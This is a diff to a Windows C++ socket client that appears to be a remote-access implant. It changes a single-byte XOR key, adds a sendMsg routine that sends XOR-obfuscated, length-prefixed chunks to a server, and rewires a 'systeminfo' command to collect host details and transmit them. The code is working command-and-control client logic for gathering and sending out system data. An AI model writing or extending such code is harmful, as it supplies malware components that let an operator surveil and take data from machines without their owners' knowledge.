@@ -14,6 +14,7 @@ g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt
 #include <vector>
 #include <string>
 #include <iomanip>
+#include <algorithm>
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -43,7 +44,7 @@ using namespace std;
 // used to encrypt/decrypt data
 char* xor_func(char msg[]) {
 	for (int i = 0; i < strlen(msg); i++) {
-		msg[i] ^= 'P';
+		msg[i] ^= '+';
 	}
 	return msg;
 }
@@ -601,6 +602,39 @@ SOCKET getConnected() {
 	return sock;
 }
 
+void sendMsg(std::string data, SOCKET sock) {
+	char* d = const_cast<char*>(data.c_str()); // cast getData as char* so it can be xor'd and used with strlen()
+	size_t msgLenCount = strlen(d);
+	printf("systeminfo length: %d\n", msgLenCount); //debug
+	
+	int msgLen = static_cast<int>(msgLenCount); // get length of message         
+	stringstream ss; // init stringstream to hold msgLen
+	ss << std::hex << msgLen; //send message length in hex
+	string msgLenStr = ss.str(); // typecast stringstream to c++ string
+	char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*
+	printf("message length content: %s\n", msgLenChar); // show the message length message
+	xor_func(msgLenChar); // xor the message length before sending
+	char lenBuf[9]; // 9 spaces for hex length int, means message length can total up to 4 gigabytes
+	strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
+	printf("message length xor'd: %s\n", lenBuf); // show the xor encoded message length message
+	printf("sending %d bytes\n", strlen(lenBuf));  // show how many bytes are sent with message length message
+	send(sock, lenBuf, strlen(lenBuf), 0); // send data
+	
+	// message sending logic
+	size_t i = 0; // initialize msgLen count variable
+	size_t bufferLen = DEFAULT_BUFLEN; // typecast DEFAULT_BUFLEN to size_t for comparison in std::min
+	char tempBuf[msgLenCount]; // make temporary buffer as large as the message
+	xor_func(d); // xor the datablock
+	while(i < msgLenCount) { // while count is less than the length of the message
+		size_t numToCopy = std::min(bufferLen, msgLenCount - i); // return the smaller of the parameter values
+		memcpy(tempBuf, d + i, numToCopy); // copy the smaller value (either 1024 or the length of the string) into the buffer
+		printf("datablock: \n\n%.*s\n", sizeof(tempBuf),tempBuf); // show what is sent in datablock
+		i += numToCopy; // increment i by number of bytes put into the buffer, next time data will start where it ended
+		printf("sending %d bytes\n", numToCopy);  // show how many bytes are sent in this datablock
+		send(sock, tempBuf, numToCopy, 0); // send the message (message length <= 1024 bytes)
+	}
+}
+
 int main() {
 	string filepath;
 	int cmd;
@@ -700,42 +734,7 @@ int main() {
 		case 3: {
 			printf("systeminfo\n");
 			data = getSysInfo();
-			printf("systeminfo length: %d\n", data.length()); //debug
-
-			// make send data function
-
-			// send message length
-			printf("messagelength content: \n\n%s", data);
-			// strcpy(buf, data.c_str());  // load data into buffer
-			
-			int msgLen = data.length(); // get length of message
-			stringstream ss; // init stringstream to hold msgLen
-			ss << std::hex << msgLen; //send message length in hex
-			string msgLenStr = ss.str(); // typecast stringstream to c++ string
-			char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*
-			xor_func(msgLenChar); // xor the message length before sending
-			char lenBuf[6]; // 5 char spaces for int, means message length can total up to a megabyte
-			strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
-			printf("message length xor'd: \n\n%s", lenBuf); //debug
-			printf("sending %d bytes\n", strlen(lenBuf));  //debug
-			send(sock, lenBuf, strlen(lenBuf), 0); // send data
-
-			// send message
-
-			printf("systeminfo content: \n\n%s", data);
-			// strcpy(buf, data.c_str());  // load data into buffer
-			char* d = const_cast<char*>(data.c_str()); // cast data as char* so it can be xor'd
-			xor_func(d); // xor the data before sending
-			strcpy(buf, d); // load xor'd data into buffer
-			printf("systeminfo xor'd: \n\n%s", buf);
-			printf("sending %d bytes\n", strlen(buf));  //debug
-			send(sock, buf, strlen(buf), 0); // send data
-			
-
-			strcpy(buf, "endofmessage"); // put end delimiter in buffer
-			xor_func(buf); // xor buffer
-			send(sock, buf, strlen(buf), 0); //send end delimiter string
-
+			sendMsg(data, sock);
 		} break;
 		}
 		//free(path);
